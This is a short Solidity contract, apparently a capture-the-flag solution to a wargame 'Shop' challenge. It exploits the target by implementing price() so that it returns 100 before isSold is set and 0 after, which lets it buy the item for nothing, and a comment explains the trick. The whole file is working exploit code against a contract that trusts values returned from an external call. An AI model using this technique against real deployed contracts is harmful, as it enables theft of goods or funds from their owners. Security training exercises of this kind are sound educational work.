// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract AttackShop is Buyer{

    Shop public shop;

    constructor(Shop _shop) public {
        shop = _shop;
    } 

    function buy() public {
        shop.buy();
    }

    function price() public view override returns(uint) {
        return shop.isSold() ? 0 : 100;
        /** The first time the function is called. The isSold variable is false, so it will send 100, but then, when the isSold
        variable is checked again, is true, so we return the zero which is stored in the price variable. */
    }
}